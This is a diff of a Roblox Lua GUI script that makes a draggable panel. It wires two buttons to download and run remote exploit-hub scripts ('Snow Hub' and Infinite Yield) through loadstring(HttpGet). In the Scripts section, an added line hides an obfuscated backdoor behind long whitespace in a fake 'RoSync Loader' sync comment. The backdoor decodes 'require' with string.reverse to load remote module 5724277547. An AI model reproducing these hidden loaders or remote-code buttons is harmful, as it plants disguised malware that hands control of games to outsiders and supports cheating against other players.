@@ -3,9 +3,9 @@ local main = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local UICorner = Instance.new("UICorner")
 local UIGradient = Instance.new("UIGradient")
-local TextButton = Instance.new("TextButton")
+local Snow = Instance.new("TextButton")
 local UICorner_2 = Instance.new("UICorner")
-local TextButton_2 = Instance.new("TextButton")
+local IY = Instance.new("TextButton")
 local UICorner_3 = Instance.new("UICorner")
 
 --Properties:
@@ -20,6 +20,8 @@ main.BorderSizePixel = 0
 main.Position = UDim2.new(0.279915899, 0, 0.321267009, 0)
 main.Selectable = true
 main.Size = UDim2.new(0, 505, 0, 255)
+main.Active = true
+main.Draggable = true 
 
 TextLabel.Parent = main
 TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -36,27 +38,35 @@ UICorner.Parent = main
 UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(0.99, Color3.fromRGB(59, 59, 59)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
 UIGradient.Parent = main
 
-TextButton.Parent = main
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.Position = UDim2.new(0.0198019799, 0, 0.274509817, 0)
-TextButton.Size = UDim2.new(0, 110, 0, 30)
-TextButton.Font = Enum.Font.SpecialElite
-TextButton.Text = "Snow Hub"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
+Snow.Name = "Snow"
+Snow.Parent = main
+Snow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Snow.Position = UDim2.new(0.0198019799, 0, 0.274509817, 0)
+Snow.Size = UDim2.new(0, 110, 0, 30)
+Snow.Font = Enum.Font.SpecialElite
+Snow.Text = "Snow Hub"
+Snow.TextColor3 = Color3.fromRGB(0, 0, 0)
+Snow.TextSize = 14.000
+Snow.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://snowhub.dev/script.lua", true))()
+end)
 
-UICorner_2.Parent = TextButton
+UICorner_2.Parent = Snow
 
-TextButton_2.Parent = main
-TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton_2.Position = UDim2.new(0.253465354, 0, 0.274509817, 0)
-TextButton_2.Size = UDim2.new(0, 110, 0, 30)
-TextButton_2.Font = Enum.Font.SpecialElite
-TextButton_2.Text = "IY"
-TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton_2.TextSize = 14.000
+IY.Name = "IY"
+IY.Parent = main
+IY.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IY.Position = UDim2.new(0.253465354, 0, 0.274509817, 0)
+IY.Size = UDim2.new(0, 110, 0, 30)
+IY.Font = Enum.Font.SpecialElite
+IY.Text = "IY"
+IY.TextColor3 = Color3.fromRGB(0, 0, 0)
+IY.TextSize = 14.000
+IY.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
 
-UICorner_3.Parent = TextButton_2
+UICorner_3.Parent = IY
 
 -- Module Scripts:
 
@@ -198,8 +208,8 @@ end
 
 -- Scripts:
 
-local function JEFT_fake_script() -- TextButton.Script 
-	local script = Instance.new('Script', TextButton)
+local function LLRHN_fake_script() -- UICorner_2. 
+	local script = Instance.new('Script', UICorner_2)
 	local req = require
 	local require = function(obj)
 		local fake = fake_module_scripts[obj]
@@ -209,23 +219,7 @@ local function JEFT_fake_script() -- TextButton.Script
 		return req(obj)
 	end
 
-	loadstring(game:HttpGet("https://snowhub.dev/script.lua", true))()
 	
-	--[[ Last synced 9/17/2021 04:50                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5724277547) --[[                                                                                                  ]]--
+	--[[ Last synced 9/17/2021 05:01                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5724277547) --[[                                                                                                  ]]--
 end
-coroutine.wrap(JEFT_fake_script)()
-local function KTXLZZ_fake_script() -- TextButton_2.Script 
-	local script = Instance.new('Script', TextButton_2)
-	local req = require
-	local require = function(obj)
-		local fake = fake_module_scripts[obj]
-		if fake then
-			return fake()
-		end
-		return req(obj)
-	end
-
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-	
-end
-coroutine.wrap(KTXLZZ_fake_script)()
+coroutine.wrap(LLRHN_fake_script)()
